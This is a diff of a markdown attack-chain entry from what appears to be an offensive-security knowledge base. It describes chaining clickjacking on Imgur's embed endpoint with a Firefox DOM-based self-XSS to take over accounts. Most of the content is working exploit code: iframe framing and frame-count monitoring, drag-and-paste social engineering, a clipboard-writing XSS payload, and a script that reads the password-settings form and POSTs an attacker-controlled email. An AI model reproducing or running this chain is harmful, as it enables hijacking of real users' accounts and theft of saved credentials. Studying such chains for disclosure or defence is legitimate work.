@@ -1,23 +1,21 @@
 ---
-id: ac-imgur-clickjack-xss-ato
+id: ac-imgur-clickjacking-xss-ato
 tags:
   - clickjacking
   - xss
   - self-xss
-  - dom-based
   - account-takeover
   - firefox
   - imgur
-  - clipboard-api
+  - dom-based
 type: attack_chain
 tools:
-  - '[[tools/firefox-browser]]'
-  - '[[tools/navigator-clipboard-api]]'
+  - '[[tools/Firefox]]'
 tactics:
   - '[[Initial Access]]'
   - '[[Execution]]'
   - '[[Credential Access]]'
-  - '[[Privilege Escalation]]'
+  - '[[Impact]]'
 verified: false
 platforms:
   - Web
@@ -25,23 +23,22 @@ submitted: true
 complexity: medium
 created_at: '2023-10-01T00:00:00Z'
 procedures:
-  - '[[procedures/setup-clickjacking-iframe-for-imgur-embed]]'
-  - '[[procedures/monitor-iframe-frames-to-detect-upload-page]]'
-  - '[[procedures/trick-user-into-dragging-image-via-ui-manipulation]]'
-  - '[[procedures/copy-malicious-payload-to-clipboard]]'
-  - '[[procedures/trigger-dom-based-self-xss-via-paste]]'
-  - '[[procedures/perform-account-takeover-via-password-form-manipulation]]'
-step_count: 6
+  - '[[procedures/Setup-ClickJacking-Iframe-for-Imgur-Embed]]'
+  - '[[procedures/Detect-Navigation-to-Vulnerable-Upload-Page]]'
+  - '[[procedures/Guide-User-Interaction-for-Payload-Delivery]]'
+  - '[[procedures/Inject-and-Execute-Self-XSS-Payload]]'
+  - '[[procedures/Perform-Account-Takeover-via-Form-Manipulation]]'
+step_count: 5
 techniques:
-  - '[[Steal Web Session Cookie]]'
+  - '[[Drive-by Compromise]]'
   - '[[JavaScript]]'
   - '[[Credentials from Web Browsers]]'
-  - '[[Account Manipulation]]'
-updated_at: '2025-12-14T03:47:13.059Z'
+  - '[[Steal Web Session Cookie]]'
+updated_at: '2025-12-14T17:33:11.908Z'
 description: >-
-  A multi-stage attack exploiting ClickJacking on Imgur embed endpoints combined
-  with DOM-based self-XSS in the beta image upload feature, leading to account
-  takeover via saved password extraction in Firefox.
+  A multi-stage attack exploiting ClickJacking and Firefox-specific DOM-based
+  self-XSS in Imgur's beta image upload to trick users into injecting payloads,
+  leading to JavaScript execution and account takeover via saved password theft.
 skill_level: intermediate
 impact_level: high
 validated: true
@@ -49,23 +46,23 @@ mitre_tactics:
   - '[[Initial Access]]'
   - '[[Execution]]'
   - '[[Credential Access]]'
-  - '[[Privilege Escalation]]'
+  - '[[Impact]]'
 mitre_techniques:
-  - '[[Steal Web Session Cookie]]'
+  - '[[Drive-by Compromise]]'
   - '[[JavaScript]]'
   - '[[Credentials from Web Browsers]]'
-  - '[[Account Manipulation]]'
+  - '[[Steal Web Session Cookie]]'
 ---
 # Chained ClickJacking and DOM-based Self-XSS for Imgur Account Takeover in Firefox
 
-Multi-stage attack chain demonstrating a complete attack workflow exploiting vulnerabilities on Imgur.com.
+Multi-stage attack chain exploiting vulnerabilities in Imgur's beta image upload page, specific to Firefox, where ClickJacking allows framing of embed pages and self-XSS enables payload injection via user interactions like dragging images and pasting clipboard content. This leads to arbitrary JavaScript execution, stealing saved passwords, and changing the victim's account email for takeover.
 
 ## Chain Metrics Dashboard
 
 | Metric | Value |
 |--------|-------|
 | Chain Status | Unverified |
-| Total Steps | 6 |
+| Total Steps | 5 |
 | Execution Time | ~5 minutes |
 | Skill Level | Intermediate |
 | Complexity | Medium |
@@ -75,204 +72,193 @@ Multi-stage attack chain demonstrating a complete attack workflow exploiting vul
 
 ```mermaid
 graph LR
-    A[Initial Access: ClickJacking Setup] --> B[Detection: Monitor Upload Page]
-    B --> C[Interaction: Drag Image Trick]
-    C --> D[Payload Delivery: Clipboard Copy]
-    D --> E[Execution: Trigger Self-XSS Paste]
-    E --> F[Impact: Account Takeover]
+    A[Setup ClickJacking Frame] --> B[Detect Vulnerable Page]
+    B --> C[Guide User Interactions]
+    C --> D[Inject Self-XSS Payload]
+    D --> E[Execute Account Takeover]
 
     style A fill:#e74c3c
     style B fill:#f39c12
     style C fill:#f39c12
     style D fill:#3498db
-    style E fill:#9b59b6
-    style F fill:#27ae60
+    style E fill:#27ae60
 ```
 
 ## Prerequisites & Requirements
 
 ### Required Tools
 
-- [[tools/firefox-browser]]
-- [[tools/navigator-clipboard-api]]
+- [[tools/Firefox]]
 
 ### Target Environment
 
-- Web platform targeting Imgur.com
-- Services: Imgur embed and beta image upload
-- Tech stack: JavaScript, HTML
-- No specific ports required (HTTPS/80,443)
+- Web platform (Imgur.com)
+- Firefox browser (version ~75.0 or vulnerable equivalents)
+- User must have Imgur account with saved passwords in Firefox
+- Attacker controls a malicious webpage (e.g., localhost for PoC)
 
 ### Initial Access Requirements
 
-- Victim must use Firefox (v75.0 or similar) with saved Imgur passwords
-- User must grant clipboard permission
-- Attacker hosts a malicious page with iframe
-- Network access: Victim visits attacker's page
+- Victim must visit attacker's malicious page
+- Victim grants clipboard API permissions in Firefox
+- No prior credentials needed; relies on social engineering via UI overlays
 
 ## Detailed Attack Procedures
 
-### Step 1: Initial Access
-procedure: [[procedures/setup-clickjacking-iframe-for-imgur-embed]]
+### Step 1: Setup ClickJacking Iframe
+procedure: [[procedures/Setup-ClickJacking-Iframe-for-Imgur-Embed]]
 
-**Objective**: Frame the Imgur embed page to initiate clickjacking without X-Frame-Options blocking.
+**Objective**: Frame the Imgur embed page to bypass X-Frame-Options and overlay malicious UI on legitimate Imgur content.
 
-**Instructions**: Host a malicious HTML page that loads an iframe sourcing the vulnerable Imgur embed endpoint. Use JavaScript to overlay invisible elements for user interaction tricking.
+**Instructions**: Embed an iframe targeting the vulnerable Imgur embed endpoint using [[commands/iframe-clickjacking-setup]]:
 
-```javascript
-// Example setup in malicious page
-let ifr = document.createElement('iframe');
-ifr.src = 'http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540';
-ifr.onload = function() { console.log('Iframe loaded'); };
-document.body.appendChild(ifr);
+```html
+<iframe src="http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540"></iframe>
 ```
 
-**Expected Output**: Iframe loads Imgur embed without framing restrictions.
-
-**Success Indicators**:
-- Iframe content visible in developer tools
-- No X-Frame-Options error in console
-
-### Step 2: Detection
-procedure: [[procedures/monitor-iframe-frames-to-detect-upload-page]]
-
-**Objective**: Detect when the victim navigates to the beta upload page by monitoring frame count.
-
-**Instructions**: Use a JavaScript interval to check the number of frames in the iframe. Trigger UI changes when frames.length == 1 (indicating upload page).
+Prepare the iframe for manipulation with [[commands/iframe-sandbox-removal]] after a delay:
 
 ```javascript
-let x = 0;
-setInterval(function() {
-  if (ifr.contentWindow.frames.length == 1) {
-    console.log('Upload page detected!');
-    btn1.innerHTML = 'drag the image to here!';
-    x = 1;
-  }
-}, 1000);
+setTimeout(function(){ifr = document.querySelector('iframe');ifr.style="";ifr.removeAttribute("sandbox");console.log(ifr);},4000)
 ```
 
-**Expected Output**: Console log "Upload page detected!" and UI update.
+**Expected Output**: Imgur embed page loads inside iframe, allowing UI redressing.
 
 **Success Indicators**:
-- Frame count logs show change to 1
-- UI prompts for next interaction appear
+- Iframe loads without X-Frame-Options block
+- Console logs the manipulated iframe
 
-### Step 3: Interaction
-procedure: [[procedures/trick-user-into-dragging-image-via-ui-manipulation]]
+### Step 2: Detect Navigation to Vulnerable Upload Page
+procedure: [[procedures/Detect-Navigation-to-Vulnerable-Upload-Page]]
 
-**Objective**: Trick the victim into dragging an image to the upload area via overlaid UI elements.
+**Objective**: Monitor the framed page to detect when the victim navigates to the beta upload page, indicated by frame count changes.
 
-**Instructions**: Set up drag-and-drop handlers on the page to detect the dragend event and sequence prompts for copying text.
+**Instructions**: Set up frame counting with [[commands/iframe-frame-count-log]]:
+
+```html
+<iframe id="ifr"></iframe><script>ifr.onload=function(){console.log(ifr.contentWindow.frames.length);}</script>
+```
+
+Monitor periodically using [[commands/frame-count-monitor-interval]]:
 
 ```javascript
-ondragend = function() {
-  btn1.innerHTML = '';
-  setTimeout(function() {
-    btn2.innerHTML = 'copy the red text and paste here after that, press enter!';
-  }, 1100);
-};
+setInterval(function(){if(i==2){console.log("stop counter...");}if(x!=1){if(ifr.contentWindow.frames.length==1){console.log("page change!");btn1.innerHTML="drag the image to here!";x=1;}}},1000)
 ```
 
-**Expected Output**: UI updates to prompt clipboard copy after drag.
-
-**Success Indicators**:
-- Drag event fires
-- Next prompt appears after 1.1 seconds
-
-### Step 4: Payload Delivery
-procedure: [[procedures/copy-malicious-payload-to-clipboard]]
-
-**Objective**: Repeatedly write the self-XSS payload to the victim's clipboard, requiring permission grant.
-
-**Instructions**: Use the navigator.clipboard API in an interval to write the payload. Victim must allow the permission prompt.
+Handle inter-frame communication with [[commands/postmessage-handler]]:
 
 ```javascript
-setInterval(function() {
-  navigator.clipboard.writeText('<<!<script>iframe src=javajavascriptscript:alert(document.domain)>');
-}, 1000);
+onmessage=function(event){console.log(event);i++;}
 ```
 
-**Expected Output**: Clipboard contains payload; console logs successful write.
+**Expected Output**: Console logs frame count; detects upload page with 1 frame.
 
 **Success Indicators**:
-- Permission granted
-- Payload verifiable in clipboard
+- Log shows "page change!" when frames.length == 1
+- UI button updates to guide dragging
 
-### Step 5: Execution
-procedure: [[procedures/trigger-dom-based-self-xss-via-paste]]
+### Step 3: Guide User Interaction for Payload Delivery
+procedure: [[procedures/Guide-User-Interaction-for-Payload-Delivery]]
 
-**Objective**: Trick victim into pasting the payload into the upload input, triggering DOM-based XSS in Firefox.
+**Objective**: Trick the victim into dragging an image and copying/pasting a disguised payload via overlaid UI elements.
 
-**Instructions**: The payload is pasted into the upload field (e.g., value='https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>'), then submit via enter or click.
+**Instructions**: Overlay a clickable button using [[commands/user-click-initiate]] (integrated in PoC HTML for button).
+
+Handle drag end to update instructions with [[commands/ondragend-ui-update]]:
 
 ```javascript
-// Payload example for paste
-document.querySelector('input[type="url"]').value = 'https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>';
-// User presses enter or clicks submit
+ondragend=function(){btn1.innerHTML="";setTimeout(function(){btn1.innerHTML="";btn2.innerHTML="copy the red text and paste here after that, press enter!";},1100)}
 ```
 
-**Expected Output**: JavaScript executes, alerting domain or manipulating DOM.
+Display red text payload in input with [[commands/red-text-payload-display]]:
 
-**Success Indicators**:
-- Alert pops up with document.domain
-- DOM elements altered (e.g., innerHTML change)
+```html
+<input type="text" name="" value="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>">
+```
 
-### Step 6: Impact
-procedure: [[procedures/perform-account-takeover-via-password-form-manipulation]]
-
-**Objective**: Use XSS to open password settings, extract saved form data, modify email, and submit for takeover.
-
-**Instructions**: From XSS context, open settings page in new window, extract form inputs, alter email, and POST.
+Detect paste with [[commands/onpaste-detection]]:
 
 ```javascript
-window.open('https://imgur.com/account/settings/password', '_blank');
-// Then in new window context:
-let forms = document.getElementsByTagName('form')[5];
-let inputs = forms.getElementsByTagName('input');
-let body = '';
-for(let i = 0; i < inputs.length; i++) {
-  if(inputs[i].name == 'email') { inputs[i].value = 'attacker@evil.com'; }
-  body += inputs[i].name + '=' + inputs[i].value + '&';
-}
-body += '_jafo[activeExperiments]=[]&_jafo[experimentData]={};
-fetch('https://imgur.com/account/settings/password', {
-  method: 'POST',
-  credentials: 'include',
-  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-  body: body
-});
+onpaste=function(){console.log("ONPASTE!");}
 ```
 
-**Expected Output**: Server accepts POST, email changed to attacker's.
+**Expected Output**: UI updates guide user; console logs "ONPASTE!" on paste.
 
 **Success Indicators**:
-- New window opens to settings
-- POST response indicates success (e.g., 200 OK)
-- Attacker gains access via new email
+- Victim drags image, triggering UI change
+- Paste event fires with payload
+
+### Step 4: Inject and Execute Self-XSS Payload
+procedure: [[procedures/Inject-and-Execute-Self-XSS-Payload]]
+
+**Objective**: Use clipboard API to prepare and inject the self-XSS payload into the upload field, executing JS on paste and enter.
+
+**Instructions**: Repeatedly write payload to clipboard with [[commands/clipboard-write-interval-generic]] and specific [[commands/clipboard-write-self-xss]]:
+
+```javascript
+setInterval(function(){navigator.clipboard.writeText("<<!<script>iframe src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})},1000)
+```
+
+Trigger execution on paste/enter in the upload page context.
+
+**Expected Output**: Payload pastes as disguised URL; JS executes on submit, alerting domain.
+
+**Success Indicators**:
+- Clipboard writes succeed (user grants permission)
+- Alert fires confirming XSS in Imgur context
+
+### Step 5: Perform Account Takeover via Form Manipulation
+procedure: [[procedures/Perform-Account-Takeover-via-Form-Manipulation]]
+
+**Objective**: Steal saved password form data, modify email, and submit to takeover the account.
+
+**Instructions**: Open password settings in new window with [[commands/window-open-password-settings]]:
+
+```javascript
+window.open("https://imgur.com/account/settings/password","_blank")
+```
+
+Extract and modify form with [[commands/form-data-extraction-modify]]:
+
+```javascript
+forms = ifr.contentDocument.getElementsByTagName("form")[5];inputs = forms.getElementsByTagName("input");body = "";for(var i =0; i < inputs.length; i++){if(inputs[i].name=="email"){inputs[i].value="keerok%40protonmail.com";}body +=inputs[i].name+"="+inputs[i].value+"&";}body += "_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D";
+```
+
+Submit via fetch with [[commands/fetch-password-change-post]]:
+
+```javascript
+await fetch("https://imgur.com/account/settings/password", {"credentials": "include","headers": {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3","Content-Type": "application/x-www-form-urlencoded","Upgrade-Insecure-Requests": "1"},"referrer": "https://imgur.com/account/settings/password","body": body,"method": "POST","mode": "cors"});
+```
+
+**Expected Output**: POST succeeds, changing victim's email to attacker's.
+
+**Success Indicators**:
+- Form data includes stolen password
+- Server accepts POST, confirming takeover
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Bypassed framing protections via ClickJacking on embed endpoints
-2. Chained social engineering to deliver self-XSS payload via clipboard
-3. Achieved full account takeover by exploiting saved passwords in Firefox
+1. Bypassed X-Frame-Options via embed endpoint for ClickJacking
+2. Detected and exploited Firefox-specific self-XSS in upload page
+3. Achieved full account takeover by manipulating saved credentials
 
 ## Technique & Tactic Coverage
 
 ### MITRE ATT&CK Techniques
 
-- [[Steal Web Session Cookie]] Drive-By Compromise (ClickJacking)
-- [[JavaScript]] JavaScript (XSS Execution)
-- [[Credentials from Web Browsers]] Credentials from Web Browsers (Saved Passwords)
-- [[Account Manipulation]] Account Manipulation (Password/Email Change)
+- [[Drive-by Compromise]] Drive-by Compromise (ClickJacking UI redressing)
+- [[JavaScript]] JavaScript (XSS payload execution)
+- [[Credentials from Web Browsers]] Credentials from Web Browsers (saved passwords)
+- [[Steal Web Session Cookie]] Steal Web Session Cookie (session hijack via ATO)
 
 ### MITRE ATT&CK Tactics
 
-- [[Initial Access]] Initial Access
-- [[Execution]] Execution
-- [[Credential Access]] Credential Access
-- [[Privilege Escalation]] Impact
+- [[Initial Access]] Initial Access (drive-by via malicious page)
+- [[Execution]] Execution (JS injection)
+- [[Credential Access]] Credential Access (password theft)
+- [[Impact]] Impact (account compromise)
 
 ---
 
